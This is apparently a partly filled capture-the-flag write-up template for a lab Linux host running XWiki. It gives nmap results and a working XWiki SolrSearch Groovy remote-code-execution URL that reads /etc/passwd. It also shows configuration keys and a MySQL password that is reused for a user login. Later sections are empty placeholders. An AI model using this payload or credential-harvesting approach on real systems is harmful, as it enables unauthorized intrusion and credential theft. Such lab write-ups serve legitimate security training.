---
os: linux
status: Active
tags: 
aliases:
---
# Resolution summary

>[!summary]
>- Step 1
>- Step 2

## Improved skills

- Skill 1
- Skill 2

## Used tools

- nmap
- gobuster


---

# Information Gathering

Scanned top 1000 TCP ports:

```sh
PORT     STATE SERVICE REASON         VERSION                                                                                                                                                      
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)                                                                                                
| ssh-hostkey:                                                                                                                                                                                     
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)                                                                                                                                    
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=                                 
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)                                                                                                                                  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_  Server Type: Jetty(10.0.20)
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 50 disallowed entries (40 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/  
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/ 
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/ 
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/ 
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/ 
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/ 
| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/ 
| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/ 
| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/ 
|_/xwiki/bin/logout/
|_http-server-header: Jetty(10.0.20)
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

Enumerated open TCP ports:

```sh

```

Enumerated top 200 UDP ports:

```sh

```

---

# Enumeration

## Port 80 - HTTP (Apache)
after navigate in the website, we found that is vulnerable to CVE. xwiki RCE
to exploit it use the following request. This will download file which have the results of command execution.
```http
http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async async%3dfalse}}{{groovy}}println("cat /etc/passwd".execute().text){{%2fgroovy}}{{%2fasync}}
```

---

# Exploitation

## POC

```sh
cat /var/lib/xwiki/data/configuration.properties

xwiki.authentication.validationKey = \uBF48\u0EE2\u03FE\u4B0F\u3C8E\u35DA\uEEB8\u4013\u1E90\uF9A7\u4040\u28EA\uD217\u288BF\u6AF7\u377E\u295C\uC98D\u17FB5\uD3D4\u967F\uB8DE\u955B\uD54B\uEE55\u890D\uAFFC\u993B\u1C49\u9B87
xwiki.authentication.encryptionKey = \uC327\u7B18\u1FFE\u913D\uEDBD\u6C85\uE778\uD7C6\u91D0\uA56F\uE1CB\u014B\uD03E\u9E5D\uED9D\uB44A\u3A0C\u1C76\uF0D6\u8289\u645F\u6EB8\u00EB\u99DA\u589E\uE3CE\uC24A\u9486\u5EAB\u2E85\uCCEB\uAF4D
```

```sh
	mysql credentials
    <property name="hibernate.connection.username">xwiki</property>
    <property name="hibernate.connection.password">theEd1t0rTeam99</property> 
    oliver theEd1t0rTeam99
```
---

# Lateral Movement to xxx

## Local enumeration
local ports
```sh
PORT      STATE SERVICE  VERSION
3306/tcp  open  mysql    MySQL 8.0.42-0ubuntu0.22.04.2
|_ssl-date: TLS randomness does not represent time
| mysql-info:
|   Protocol: 10
|   Version: 8.0.42-0ubuntu0.22.04.2
|   Thread ID: 144
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolNew, SupportsCompression, ODBCClient, LongColumnFlag, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, SupportsLoadDataLocal, ConnectWithDatabase, SwitchToSSLAfterHandshake, LongPassword, DontAllowDatabaseTableColumn, InteractiveClient, FoundRows, IgnoreSpaceBeforeParenthesis, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: i\x10EL4\x04Dco\Q\x01xN#\x0Fl\x0DgP
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.42_Auto_Generated_Server_Certificate
| Not valid before: 2025-06-13T17:01:00
|_Not valid after:  2035-06-11T17:01:00
8079/tcp  open  unknown
8125/tcp  open  unknown
19999/tcp open  dnp-sec?  "https://registry.my-netdata.io"
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Server: Netdata Embedded HTTP Server v1.45.2
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Credentials: true
|     Date: Tue, 05 Aug 2025 08:27:06 GMT
|     Content-Type: text/plain; charset=utf-8
|     Cache-Control: no-cache, no-store, must-revalidate
|     Pragma: no-cache
|     Expires: Tue, 05 Aug 2025 08:27:06 GMT
|     Content-Length: 43
|     X-Transaction-ID: 46f971cc8cc04adbb806c7aac3d32b02
|     HTTP method requested is not supported...
|   GetRequest:
|     HTTP/1.1 200 OK
|     Connection: close
|     Server: Netdata Embedded HTTP Server v1.45.2
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Credentials: true
|     Date: Mon, 01 Apr 2024 15:36:37 GMT
|     Content-Type: text/html; charset=utf-8
|     Cache-Control: public
|     Expires: Tue, 02 Apr 2024 15:36:37 GMT
|     Content-Length: 12670
|     X-Transaction-ID: 93ca7aff65c64d5480e8e87c1d838a22
|     <!doctype html><html><head><title>Netdata Agent Console</title><script>let pathsRegex = //(spaces|nodes|overview|alerts|dashboards|anomalies|events|cloud|v2)/?.*/
|     getBasename = function() {
|     return window.location.origin + window.location.pathname.replace(pathsRegex, "")
|     goToOld = function(path) {
|     goToUrl = getBasename() + path;
|     (path === "/v2") {
|     pathsRegex = /(/(spaces|nodes|overview|alerts|dashboards|anomalies|events|cloud)/?.*)/
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Connection: close
|     Server: Netdata Embedded HTTP Server v1.45.2
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Credentials: true
|     Date: Tue, 05 Aug 2025 08:27:13 GMT
|     Content-Type: text/plain; charset=utf-8
|     Access-Control-Allow-Methods: GET, OPTIONS
|     Access-Control-Allow-Headers: accept, x-requested-with, origin, content-type, cookie, pragma, cache-control, x-auth-token
|     Access-Control-Max-Age: 1209600
|     Content-Length: 2
|_    X-Transaction-ID: cc172a728ea84ed9b82b8999efd3152d
33060/tcp open  mysqlx?
| fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|     HY000
|   LDAPBindReq:
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns:
|     Invalid message-frame."
|_    HY000
41433/tcp open  unknown
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 Not Found
|     Date: Tue, 05 Aug 2025 08:28:21 GMT
|     Content-Length: 19
|     Content-Type: text/plain; charset=utf-8
|     404: Page Not Found
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 404 Not Found
|     Date: Tue, 05 Aug 2025 08:27:09 GMT
|     Content-Length: 19
|     Content-Type: text/plain; charset=utf-8
|     404: Page Not Found
|   HTTPOptions:
|     HTTP/1.0 404 Not Found
|     Date: Tue, 05 Aug 2025 08:27:18 GMT
|     Content-Length: 19
|     Content-Type: text/plain; charset=utf-8
|_    404: Page Not Found
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port19999-TCP:V=7.94SVN%I=7%D=8/5%Time=6891C079%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,1D4,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\nServer:\x20Netdata\x20Embedded\x20HTTP\x20Server\x20v1\.45\.2
SF:\r\nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Allow-Credenti
SF:als:\x20true\r\nDate:\x20Tue,\x2005\x20Aug\x202025\x2008:27:06\x20GMT\r
SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCache-Control:\x20no
SF:-cache,\x20no-store,\x20must-revalidate\r\nPragma:\x20no-cache\r\nExpir
SF:es:\x20Tue,\x2005\x20Aug\x202025\x2008:27:06\x20GMT\r\nContent-Length:\
SF:x2043\r\nX-Transaction-ID:\x2046f971cc8cc04adbb806c7aac3d32b02\r\n\r\nH
SF:TTP\x20method\x20requested\x20is\x20not\x20supported\.\.\.\r\n")%r(GetR
SF:equest,32F1,"HTTP/1\.1\x20200\x20OK\r\nConnection:\x20close\r\nServer:\
SF:x20Netdata\x20Embedded\x20HTTP\x20Server\x20v1\.45\.2\r\nAccess-Control
SF:-Allow-Origin:\x20\*\r\nAccess-Control-Allow-Credentials:\x20true\r\nDa
SF:te:\x20Mon,\x2001\x20Apr\x202024\x2015:36:37\x20GMT\r\nContent-Type:\x2
SF:0text/html;\x20charset=utf-8\r\nCache-Control:\x20public\r\nExpires:\x2
SF:0Tue,\x2002\x20Apr\x202024\x2015:36:37\x20GMT\r\nContent-Length:\x20126
SF:70\r\nX-Transaction-ID:\x2093ca7aff65c64d5480e8e87c1d838a22\r\n\r\n<!do
SF:ctype\x20html><html><head><title>Netdata\x20Agent\x20Console</title><sc
SF:ript>let\x20pathsRegex\x20=\x20/\\/\(spaces\|nodes\|overview\|alerts\|d
SF:ashboards\|anomalies\|events\|cloud\|v2\)\\/\?\.\*/\n\x20\x20\x20\x20\x
SF:20\x20let\x20getBasename\x20=\x20function\(\)\x20{\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20return\x20window\.location\.origin\x20\+\x20window\.locati
SF:on\.pathname\.replace\(pathsRegex,\x20\"\"\)\n\x20\x20\x20\x20\x20\x20}
SF:\n\x20\x20\x20\x20\x20\x20let\x20goToOld\x20=\x20function\(path\)\x20{\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20let\x20goToUrl\x20=\x20getBasename\(\)
SF:\x20\+\x20path;\n\x20\x20\x20\x20\x20\x20\x20\x20if\x20\(path\x20===\x2
SF:0\"/v2\"\)\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20let\x20pathsRe
SF:gex\x20=\x20/\(\\/\(spaces\|nodes\|overview\|alerts\|dashboards\|anomal
SF:ies\|events\|cloud\)\\/\?\.\*\)/\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20if\x20\(pa")%r(HTTPOptions,1FB,"HTTP/1\.1\x20200\x20OK\r\nConnection
SF::\x20close\r\nServer:\x20Netdata\x20Embedded\x20HTTP\x20Server\x20v1\.4
SF:5\.2\r\nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Allow-Cred
SF:entials:\x20true\r\nDate:\x20Tue,\x2005\x20Aug\x202025\x2008:27:13\x20G
SF:MT\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nAccess-Control-A
SF:llow-Methods:\x20GET,\x20OPTIONS\r\nAccess-Control-Allow-Headers:\x20ac
SF:cept,\x20x-requested-with,\x20origin,\x20content-type,\x20cookie,\x20pr
SF:agma,\x20cache-control,\x20x-auth-token\r\nAccess-Control-Max-Age:\x201
SF:209600\r\nContent-Length:\x202\r\nX-Transaction-ID:\x20cc172a728ea84ed9
SF:b82b8999efd3152d\r\n\r\nOK");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port33060-TCP:V=7.94SVN%I=7%D=8/5%Time=6891C078%P=x86_64-pc-linux-gnu%r
SF:(NULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0
SF:b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTP
SF:Options,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x
SF:0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVe
SF:rsionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP
SF:,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0
SF:fInvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0
SF:")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x
SF:01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCook
SF:ie,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b
SF:\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message
SF:\"\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05H
SF:Y000")%r(FourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDStrin
SF:g,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\
SF:x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\
SF:"\x05HY000")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x0
SF:1\x08\x01\x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20
SF:message\"\x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(L
SF:ANDesk-RC,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\
SF:0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Notes
SF:RPC,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a
SF:\x0fInvalid\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05
SF:\x1a\0")%r(WMSRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Inval
SF:id\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05
SF:\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x
SF:10\x88'\x1a\x0fInvalid\x20message\"\x05HY000");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port41433-TCP:V=7.94SVN%I=7%D=8/5%Time=6891C079%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,8F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nDat
SF:e:\x20Tue,\x2005\x20Aug\x202025\x2008:27:09\x20GMT\r\nContent-Length:\x
SF:2019\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\n404:\x20Pa
SF:ge\x20Not\x20Found")%r(HTTPOptions,8F,"HTTP/1\.0\x20404\x20Not\x20Found
SF:\r\nDate:\x20Tue,\x2005\x20Aug\x202025\x2008:27:18\x20GMT\r\nContent-Le
SF:ngth:\x2019\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\n404
SF::\x20Page\x20Not\x20Found")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnectio
SF:n:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nC
SF:onnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"
SF:HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20c
SF:harset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(T
SF:erminalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x
SF:20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCo
SF:nnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,8
SF:F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nDate:\x20Tue,\x2005\x20Aug\x2020
SF:25\x2008:28:21\x20GMT\r\nContent-Length:\x2019\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\n\r\n404:\x20Page\x20Not\x20Found")%r(LPDStr
SF:ing,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pla
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reque
SF:st")%r(LDAPSearchReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-
SF:Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n40
SF:0\x20Bad\x20Request");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 308.20 seconds

```


## Lateral movement vector

---

# Privilege Escalation to xxx

## Local enumeration


## Privilege Escalation vector


---

# Trophy

{{image}}

>[!todo] **User.txt**
>flag

>[!todo] **Root.txt**
>flag

**/etc/shadow**

```sh

```